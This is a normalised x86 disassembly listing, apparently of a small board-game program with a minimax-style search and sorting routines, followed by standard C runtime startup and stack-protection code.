mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov edi [ ebp + 0x10 ]
inc [ eax ]
xor edx edx
cmp [ edi ] edx
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
mov ecx [ ecx ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
sub_409ea0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push 0x1000
push 0x0
push rw-data
call sub_40be70
push 0x80
push 0x0
push rw-data
call sub_40be70
push 0x80
push 0x0
push rw-data
call sub_40be70
push 0x80
push 0x0
push rw-data
call sub_40be70
push 0x80
push 0x0
push rw-data
call sub_40be70
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push rw-data
push rw-data
push esi
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_405e30
mov ecx [ esi ]
add esp 0x50
mov edx [ ecx * 4 + r--data ]
mov esi [ ecx * 4 + r--data ]
cmp edx esi
jg r-xdata
push edi
mov edi ebx
xor esi esi
nop [ eax + eax ] ax
xor eax eax
test ecx ecx
mov ecx edx
sete al
shl ecx 0x5
mov eax [ eax * 4 + r--data ]
add eax ecx
lea eax [ eax * 4 + rw-data ]
add esi 0x4
add edi 0x8
cmp esi 0x80
jl r-xdata
mov eax [ esi + r--data ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
imul eax eax 0xb
add eax [ edi ]
mov eax [ eax * 4 + r--data ]
mov eax [ eax * 4 + r--data ]
add eax ebx
mov [ esi + rw-data ] eax
pop esi
mov eax 0x25e4
pop ebx
mov esp ebp
pop ebp
retn
inc edx
sub eax 0xffffff80
cmp edx esi
jle r-xdata
mov edx [ esi + r--data ]
mov ebx [ edx * 4 + r--data ]
imul ebx [ esi + rw-data ]
add ebx [ edx * 4 + r--data ]
mov [ esi + rw-data ] ebx
cmp edx 0x6
jne r-xdata
mov esi rw-data
xor edi edi
cmp [ eax ] 0x0
jne r-xdata
add ecx 0x4
add esi 0x4
cmp ecx 0x80
jl r-xdata
mov eax [ edi + r--data ]
cmp eax [ ecx + r--data ]
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
add edi 0x4
cmp esi rw-data
jl r-xdata
mov eax [ ecx + rw-data ]
mov edx eax
shl edx 0x4
sub edx eax
mov eax 0x51eb851f
add edx edx
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
add [ edi + rw-data ] eax
dec [ ecx + rw-data ]
inc [ ecx + rw-data ]
cmp [ ecx + rw-data ] 0x0
jne r-xdata
xor ecx ecx
mov eax [ ebp + 0x10 ]
mov ebx [ eax ]
mov esi [ ebx * 4 + r--data ]
mov ecx esi
mov edx [ ebx * 4 + r--data ]
mov [ ebp - 0x8 ] esi
cmp ecx edx
jg r-xdata
imul edx [ ecx + rw-data ] 0x19
mov eax 0x51eb851f
mov [ ecx + rw-data ] 0x1
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
add [ edi + rw-data ] eax
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x0
test ebx ebx
mov [ rw-data ] 0x20
sete al
mov edx [ eax * 4 + r--data ]
mov ecx edx
mov ebx [ eax * 4 + r--data ]
cmp ecx ebx
jg r-xdata
mov esi [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
nop [ eax ] eax
xor ecx ecx
cmp edx ebx
jg r-xdata
mov eax ecx
shl eax 0x5
add eax esi
lea edi [ eax * 4 + rw-data ]
mov eax [ ebp + 0xc ]
inc ecx
cmp ecx edx
jle r-xdata
mov eax [ ecx * 4 + rw-data ]
add eax [ ecx * 4 + rw-data ]
add esi eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
add eax ecx
pop ebx
mov esp ebp
pop ebp
retn
nop
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ecx * 4 + rw-data ]
add eax [ ecx * 4 + rw-data ]
sub [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
cmp [ edi + ecx * 8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x8 ]
inc edx
cmp edx ebx
jle r-xdata
mov eax [ edx * 4 + rw-data ]
cmp eax ecx
cmovg ecx eax
cmp [ ecx * 4 + rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] ecx
jl r-xdata
inc ecx
sub edi 0xffffff80
cmp ecx ebx
jle r-xdata
cmp [ edx * 4 + rw-data ] 0x0
jge r-xdata
mov edi [ ebp + 0x10 ]
xor ecx ecx
mov eax [ edi ]
mov edx [ eax * 4 + r--data ]
cmp esi edx
jg r-xdata
cmp [ eax + ecx * 8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
sub eax ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi * 4 + rw-data ] 0x0
jge r-xdata
inc esi
cmp esi edx
jle r-xdata
mov eax [ esi * 4 + rw-data ]
cmp eax ecx
cmovg ecx eax
sub_40a1b0
push ebp
mov ebp esp
mov edx [ ebp + 0x18 ]
sub esp 0x1c
mov eax edx
push esi
mov esi [ ebp + 0x14 ]
sub eax esi
test eax eax
jle r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
lea eax [ esi + edx ]
cdq
sub eax edx
mov edx [ ebp + 0xc ]
sar eax 0x1
mov esi [ edx + eax * 4 ]
lea edx [ edx + eax * 4 ]
mov edi [ ebx + eax * 4 ]
lea ecx [ ebx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov esi [ ebp + 0x10 ]
lea esi [ esi + eax * 8 ]
mov [ ebp - 0x4 ] edi
mov eax [ esi ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x14 ]
lea eax [ ebx + eax * 4 ]
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] edi
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ edx ]
lea eax [ eax + edi * 4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov [ edx ] eax
mov eax [ ebp - 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ esi ]
lea edi [ eax + edi * 8 ]
mov eax [ edi ]
mov edx [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov esi eax
mov [ ebp - 0x14 ] edi
mov [ edi ] ecx
mov [ edi + 0x4 ] edx
mov edi [ ebp + 0x14 ]
lea eax [ ebx + eax * 4 ]
inc edi
mov eax [ ebx + edx * 4 ]
cmp eax [ ebx + esi * 4 ]
jg r-xdata
cmp ecx [ eax ]
jle r-xdata
nop [ eax ] eax
mov ecx eax
mov eax [ ebx + esi * 4 ]
mov [ ebx + edx * 4 ] eax
mov edx [ ebp + 0xc ]
mov [ ebx + esi * 4 ] ecx
mov ebx [ ebp + 0x18 ]
mov eax [ edx + esi * 4 ]
mov ecx [ edx + ebx * 4 ]
mov [ edx + ebx * 4 ] eax
mov [ edx + esi * 4 ] ecx
mov eax [ edi + esi * 8 ]
mov ecx [ edi + ebx * 8 ]
mov edx [ edi + ebx * 8 + 0x4 ]
mov [ edi + ebx * 8 ] eax
mov eax [ edi + esi * 8 + 0x4 ]
mov [ edi + ebx * 8 + 0x4 ] eax
mov [ edi + esi * 8 ] ecx
mov [ edi + esi * 8 + 0x4 ] edx
cmp edi esi
jge r-xdata
nop
inc edi
cmp edi esi
jle r-xdata
mov eax [ ebx + esi * 4 ]
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov [ ebx + esi * 4 ] ecx
mov ecx [ ebp + 0xc ]
mov eax [ ecx + esi * 4 ]
mov [ edx ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov [ ecx + esi * 4 ] eax
mov eax [ edi + esi * 8 ]
mov [ edx ] eax
mov eax [ edi + esi * 8 + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp + 0x14 ]
mov [ edi + esi * 8 ] eax
mov eax [ ebp - 0x1c ]
mov [ edi + esi * 8 + 0x4 ] eax
lea eax [ esi - 0x1 ]
cmp edx eax
jge r-xdata
mov ecx [ ebx + edi * 4 ]
lea edx [ ebx + esi * 4 ]
mov eax [ edx ]
mov [ ebx + edi * 4 ] eax
mov ebx [ ebp + 0x10 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov ecx [ edx + edi * 4 ]
mov eax [ edx + esi * 4 ]
mov [ edx + edi * 4 ] eax
mov eax [ ebp + 0x10 ]
mov [ edx + esi * 4 ] ecx
mov ecx [ eax + edi * 8 ]
mov edx [ eax + edi * 8 + 0x4 ]
mov eax [ eax + esi * 8 ]
mov [ ebx + edi * 8 ] eax
mov eax ebx
mov eax [ eax + esi * 8 + 0x4 ]
mov [ ebx + edi * 8 + 0x4 ] eax
mov eax ebx
mov ebx [ ebp + 0x8 ]
mov [ eax + esi * 8 ] ecx
mov [ eax + esi * 8 + 0x4 ] edx
lea eax [ ebx + esi * 4 ]
jmp r-xdata
dec esi
cmp ecx [ ebx + esi * 4 ]
jg r-xdata
cmp [ ebx + edi * 4 ] ecx
jl r-xdata
mov edx [ ebp + 0x18 ]
inc esi
mov [ ebp + 0x14 ] esi
cmp esi edx
jge r-xdata
push eax
push edx
push edi
push ecx
push ebx
call sub_40a1b0
add esp 0x14
mov ecx [ ebp - 0x4 ]
cmp edi esi
jg r-xdata
pop edi
pop ebx
mov eax edx
sub eax esi
test eax eax
jg r-xdata
cmp eax 0x1
jne r-xdata
pop edi
pop ebx
pop esi
mov esp ebp
pop ebp
retn
sub_40a390
push ebp
mov ebp esp
sub esp 0x810
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x7e0 ] ebx
mov [ ebp - 0x800 ] eax
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x7e8 ] esi
mov ebx [ edi + esi * 8 ]
mov [ ebp - 0x7f4 ] ebx
mov ebx [ edi + esi * 8 + 0x4 ]
lea esi [ edx + eax * 4 ]
mov [ ebp - 0x7f8 ] ebx
xor eax eax
mov ebx [ ebp - 0x7e0 ]
mov [ ebp - 0x804 ] ecx
mov ecx [ esi ]
mov [ ebp - 0x7f0 ] edx
cmp [ ebx ] eax
mov [ ebp - 0x7e4 ] edi
sete al
mov [ ebp - 0x7fc ] 0x20
mov [ ebp - 0x808 ] esi
cmp [ ecx * 4 + r--data ] eax
jne r-xdata
mov eax [ ebp - 0x7e8 ]
mov ecx [ ebp + 0x24 ]
mov [ esi ] eax
dec ecx
mov eax [ ebp - 0x7f4 ]
mov esi [ ebp - 0x7f8 ]
mov [ ebp + 0x24 ] ecx
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
mov esi [ ebp - 0x7e8 ]
lea eax [ edx + eax * 4 ]
mov [ eax ] 0x20
mov [ ebp - 0x810 ] eax
mov eax [ ebp - 0x800 ]
mov [ edi + esi * 8 ] eax
mov eax [ ebp - 0x804 ]
mov [ edi + esi * 8 + 0x4 ] eax
xor eax eax
cmp [ ebx ] eax
sete al
mov [ ebx ] eax
test ecx ecx
jle r-xdata
mov [ ebp - 0x7fc ] ecx
test ecx ecx
je r-xdata
push ebx
push edi
push edx
call sub_409ea0
add esp 0xc
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x7dc ]
push eax
lea eax [ ebp - 0x7d4 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push ebx
push edi
push edx
call sub_407550
add esp 0x18
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x270f
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
cmp ecx 0x10
je r-xdata
mov eax [ ebp - 0x7e8 ]
mov ecx [ ebp - 0x7f4 ]
mov [ edi + eax * 8 ] ecx
mov ecx [ ebp - 0x7f8 ]
mov [ edi + eax * 8 + 0x4 ] ecx
mov ecx [ ebp - 0x810 ]
mov [ ecx ] eax
mov eax [ ebp - 0x7fc ]
cmp eax 0x20
je r-xdata
mov esi 0x2648
jmp r-xdata
mov edx [ ebp + 0x24 ]
mov eax [ ebp - 0x7dc ]
cmp edx 0x2
jl r-xdata
mov [ edi + ecx * 8 ] 0x0
mov ecx [ ebp - 0x808 ]
mov [ ecx ] 0x20
mov ecx [ ebp - 0x800 ]
mov [ edi + eax * 8 ] ecx
mov ecx [ ebp - 0x804 ]
mov [ edi + eax * 8 + 0x4 ] ecx
mov ecx [ ebp - 0x808 ]
mov [ ecx ] eax
jmp r-xdata
xor edi edi
mov [ ebp - 0x7d8 ] eax
mov esi 0xffffd8f0
test eax eax
jle r-xdata
xor ecx ecx
mov esi 0xffffd8f0
mov [ ebp - 0x7ec ] ecx
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebx ] eax
pop edi
sete al
neg esi
mov [ ebx ] eax
xor ecx ebp
mov eax esi
pop esi
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x7e4 ]
neg [ ebp + 0x20 ]
lea ebx [ ebp - 0x7d4 ]
dec eax
push eax
push 0x0
lea eax [ ebp - 0x7d4 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
lea eax [ ebp - 0x3ec ]
push eax
call sub_40a1b0
mov edx [ ebp + 0x24 ]
add esp 0x14
mov eax 0x7
add edx 0xfffffffe
lea eax [ ebp - 0x7d4 ]
mov [ ebp - 0x80c ] edx
mov [ ebp - 0x7d8 ] eax
nop [ eax + eax ] eax
mov ebx [ ebp - 0x7e0 ]
mov edx [ ebp + 0x24 ]
inc edi
add ebx 0x8
cmp edi [ ebp - 0x7d8 ]
jl r-xdata
push edx
push 0xffffd8f0
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + ecx * 4 - 0x1f8 ]
push ebx
push edi
push [ ebp - 0x7f0 ]
call sub_40a390
mov ecx [ ebp - 0x7ec ]
add esp 0x20
mov edx [ ebp - 0x80c ]
cmp eax esi
cmovg esi eax
mov [ ebp + ecx * 4 - 0x3ec ] eax
inc ecx
mov eax [ ebp - 0x7d8 ]
add eax 0x8
mov [ ebp - 0x7ec ] ecx
mov [ ebp - 0x7d8 ] eax
cmp ecx [ ebp - 0x7dc ]
jl r-xdata
mov eax [ ebp - 0x7dc ]
push edx
push esi
push [ ebx + 0x4 ]
push [ ebx ]
push [ ebp + edi * 4 - 0x1f8 ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x7e4 ]
push [ ebp - 0x7f0 ]
call sub_40a390
add esp 0x20
cmp eax esi
cmovg esi eax
cmp eax [ ebp + 0x20 ]
jge r-xdata
sub_40a690
push ebp
mov ebp esp
sub esp 0x7ec
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
lea edi [ ebp - 0x7d8 ]
mov [ ebp - 0x7e4 ] eax
push edi
lea edi [ ebp - 0x5e0 ]
mov [ ebp - 0x7e0 ] ecx
push edi
lea edi [ ebp - 0x1f8 ]
mov [ ebp - 0x7dc ] edx
push edi
push edx
push ecx
push eax
mov [ ebp - 0x7ec ] esi
mov [ ebp - 0x7e8 ] ebx
call sub_407550
add esp 0x18
test eax eax
je r-xdata
mov ecx [ ebp - 0x7d8 ]
test ecx ecx
jle r-xdata
mov eax [ ebp - 0x7d8 ]
mov esi 0xffffd8f0
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
pop edi
mov [ esi ] 0x20
xor ecx ebp
pop esi
mov [ ebx ] 0x0
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov eax [ ebp + ecx * 4 - 0x1fc ]
mov [ esi ] eax
mov eax [ ebp + ecx * 8 - 0x5e8 ]
mov [ ebx ] eax
mov eax [ ebp + ecx * 8 - 0x5e4 ]
pop edi
mov [ ebx + 0x4 ] eax
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
dec eax
push eax
push 0x0
lea eax [ ebp - 0x5e0 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
lea eax [ ebp - 0x7d4 ]
push eax
call sub_40a1b0
mov ecx 0xffffd8f0
lea esi [ ebp - 0x5e0 ]
add esp 0x14
mov [ ebp - 0x7d8 ] ecx
xor edi edi
lea edi [ ebp - 0x5e0 ]
xor ebx ebx
inc edi
add esi 0x8
cmp edi 0x7
jl r-xdata
mov edx [ ebp - 0x7ec ]
mov ecx eax
mov eax [ ebp + edi * 4 - 0x1f8 ]
mov [ ebp - 0x7d8 ] ecx
mov [ edx ] eax
mov eax [ esi ]
mov [ ebx ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x4 ] eax
push 0x4
push 0xffffd8f0
push [ edi + 0x4 ]
push [ edi ]
push [ ebp + ebx * 4 - 0x1f8 ]
push [ ebp - 0x7dc ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x7e4 ]
call sub_40a390
add esp 0x20
mov [ ebp + ebx * 4 - 0x7d4 ] eax
cmp eax esi
lea edi [ edi + 0x8 ]
cmovg esi eax
mov eax [ ebp - 0x7d8 ]
inc ebx
cmp ebx eax
jl r-xdata
mov ebx [ ebp - 0x7e8 ]
push 0x6
push ecx
push [ esi + 0x4 ]
push [ esi ]
push [ ebp + edi * 4 - 0x1f8 ]
push [ ebp - 0x7dc ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x7e4 ]
call sub_40a390
mov ecx [ ebp - 0x7d8 ]
add esp 0x20
cmp eax ecx
jle r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub_40a861
push ebp
mov ebp esp
jmp r-xdata
push [ ebp + 0x8 ]
call sub_410eea
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_410e54
pop ecx
test eax eax
jne r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
call sub_40abfe
call sub_40ac1b
sub_40a8c0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax

cmp ecx eax
r-xdata
sub_40a8ed
push esi
push 0x2
call sub_41106e
call sub_40b078
push eax
call sub_411700
call sub_411831
mov esi eax
call sub_40b07e
push 0x1
mov [ esi ] eax
call sub_40ae1f
add esp 0xc
pop esi
test al al
je r-xdata
push 0x7
call sub_40b0e9
int3
fnclex
call sub_40b28c
push sub_40b2b7
call sub_40afc3
call sub_40b074
push eax
call sub_4113f6
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_40b081
call sub_40b0d1
test eax eax
je r-xdata
call sub_40c250
call sub_40c250
call sub_40b08d
call sub_40b07e
push eax
call sub_41179a
pop ecx
call j_sub_411401
call sub_40b07e
xor eax eax
retn
push sub_40b07e
call sub_4110f3
pop ecx
sub_40a9a2
push 0x14
push r--data
call sub_40b2f0
push 0x1
call sub_40ade6
pop ecx
test al al
jne r-xdata
xor bl bl
mov [ ebp - 0x19 ] bl
and [ ebp - 0x4 ] 0x0
call sub_40adb1
mov [ ebp - 0x24 ] al
mov eax [ rw-data ]
xor ecx ecx
inc ecx
cmp eax ecx
je r-xdata
push 0x7
call sub_40b0e9
test eax eax
jne r-xdata
mov bl cl
mov [ ebp - 0x19 ] bl
mov [ rw-data ] ecx
push r--data
push r--data
call sub_4116bb
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40b0e3
mov esi eax
cmp [ esi ] edi
je r-xdata
push esi
call sub_40aeb6
pop ecx
test al al
je r-xdata
push r--data
push r--data
call sub_41165f
pop ecx
pop ecx
mov [ rw-data ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
jmp r-xdata
push edi
call sub_40c28b
pop ecx
call sub_40b204
movzx eax ax
push eax
call sub_41160c
push eax
push edi
push __dos_header
call sub_404940
mov esi eax
push edi
call sub_40c327
pop ecx
call sub_40e3d0
test al al
jne r-xdata
push esi
call sub_40aeb6
pop ecx
test al al
je r-xdata
push edi
push 0x2
push edi
mov esi [ esi ]
mov ecx esi
call j_sub_40c250
call esi
push [ ebp - 0x24 ]
call sub_40af43
pop ecx
call sub_40b0dd
mov esi eax
xor edi edi
cmp [ esi ] edi
je r-xdata
call sub_40b336
retn
test bl bl
jne r-xdata
push esi
call sub_40e4f9
push [ esi ]
call sub_40e4c1
pop ecx
push edi
push 0x1
call sub_40af60
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
jmp r-xdata
call sub_40e49c
sub_40aae9
mov esp [ ebp - 0x18 ]
call sub_40e3d0
test al al
jne r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
push [ ebp - 0x20 ]
call sub_40e4ab
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40b336
retn
call sub_40e48d
sub_40ab22
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] esi
call sub_40ab94
mov [ esi ] r--data
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40ab5b
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] esi
call sub_40ab94
mov [ esi ] r--data
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40ab94
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
push eax
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_40c58a
pop ecx
pop ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40abd1
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40c5ed
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40a894
pop ecx
pop ecx
sub_40ac72
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
